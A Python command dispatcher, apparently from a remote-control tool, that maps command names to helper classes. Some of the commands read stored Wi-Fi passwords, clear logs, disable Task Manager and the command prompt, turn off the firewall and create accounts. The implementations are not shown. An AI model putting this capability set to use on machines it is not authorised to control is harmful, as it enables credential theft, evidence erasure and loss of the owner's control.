from . import *
INVALID_COMMAND = "INVALID_COMMAND"


create_account = "create_account"
get_accounts = "get_accounts"

disable_cmd_fully = "disable_cmd_fully"
disable_cmd = "disable_cmd"
enable_cmd = "enable_cmd"

firewall_on = "firewall_on"
firewall_off = "firewall_off"

get_cpu_usage = "get_cpu_usage"
get_ram_usage_info = "get_ram_usage_info"
get_disk_usage_info = "get_disk_usage_info"
get_disk_info = "get_disk_info"

get_hostfile_contents = "get_hostfile_contents"
write_hostfile_contents = "write_hostfile_contents"

get_installed_programs = "get_installed_programs"
run_uninstaller = "run_uninstaller"

enable_internet = "enable_internet"
disable_internet = "disable_internet"

clear_logs = "clear_logs"

get_adapter_stats = "get_adapter_stats"
get_adapters = "get_adapters"
get_devices_on_network = "get_devices_on_network"
get_wifi_networks_windows = "get_wifi_networks_windows"
get_wifi_passwords_windows = "get_wifi_passwords_windows"
get_ip_info = "get_ip_info"
get_country = "get_country"
get_public_ip = "get_public_ip"

minimize_all_windows = "minimize_all_windows"
freeze_pc = "freeze_pc"
logout = "logout"
restart = "restart"
shutdown = "shutdown"

kill_process = "kill_process"
get_processes = "get_processes"

geo_locate = "geo_locate"
get_username = "get_username"
get_uptime = "get_uptime"
get_system_info = "get_system_info"

enable_taskmanager = "enable_taskmanager"
disable_taskmanager = "disable_taskmanager"

def get_result(command, args):
    if command == create_account:
        return Account.create_account(*args)
    elif command == get_accounts:
        return Account.get_accounts(*args)

    elif command == disable_cmd_fully:
        return cmd_obj.disable_fully(*args)
    elif command == disable_cmd:
        return cmd_obj.disable(*args)
    elif command == enable_cmd:
        return cmd_obj.enable(*args)

    elif command == firewall_on:
        return Firewall.firewall_on(*args)
    elif command == firewall_off:
        return Firewall.firewall_off(*args)

    elif command == get_cpu_usage:
        return HardwareInfo.get_cpu_usage(*args)
    elif command == get_ram_usage_info:
        return HardwareInfo.get_ram_usage_info(*args)
    elif command == get_disk_usage_info:
        return HardwareInfo.get_disk_usage_info(*args)
    elif command == get_disk_info:
        return HardwareInfo.get_disk_info(*args)

    elif command == get_hostfile_contents:
        return Hostfile.get_hostfile_contents(*args)
    elif command == write_hostfile_contents:
        return Hostfile.write_hostfile_contents(*args)

    elif command == get_installed_programs:
        return programs_obj.get_installed_programs(*args)
    elif command == run_uninstaller:
        return programs_obj.run_uninstaller(*args)
        
    elif command == enable_internet:
        return Internet.enable(*args)
    elif command == disable_internet:
        return Internet.disable(*args)

    elif command == clear_logs:
        return Logs.clear_logs(*args)

    elif command == get_adapter_stats:
        return NetworkInfo.get_adapter_stats(*args)
    elif command == get_adapters:
        return NetworkInfo.get_adapters(*args)
    elif command == get_devices_on_network:
        return NetworkInfo.get_devices_on_network(*args)
    elif command == get_wifi_networks_windows:
        return NetworkInfo.get_wifi_networks_windows(*args)
    elif command == get_wifi_passwords_windows:
        return NetworkInfo.get_wifi_passwords_windows(*args)
    elif command == get_ip_info:
        return NetworkInfo.get_ip_info(*args)
    elif command == get_country:
        return NetworkInfo.get_country(*args)
    elif command == get_public_ip:
        return NetworkInfo.get_public_ip(*args)

    elif command == minimize_all_windows:
        return Pc.minimize_all_windows(*args)
    elif command == freeze_pc:
        return Pc.freeze_pc(*args)
    elif command == logout:
        return Pc.logout(*args)
    elif command == restart:
        return Pc.restart(*args)
    elif command == shutdown:
        return Pc.shutdown(*args)

    elif command == kill_process:
        return Process.kill_process(*args)
    elif command == get_processes:
        return Process.get_processes(*args)

    elif command == geo_locate:
        return SysInfo.geo_locate(*args)
    elif command == get_uptime:
        return SysInfo.get_uptime(*args)
    elif command == get_username:
        return SysInfo.get_username(*args)
    elif command == get_system_info:
        return SysInfo.get_system_info(*args)

    elif command == enable_taskmanager:
        return TaskManager.enable(*args)
    elif command == disable_taskmanager:
        return TaskManager.disable(*args)

    else: 
        return INVALID_COMMAND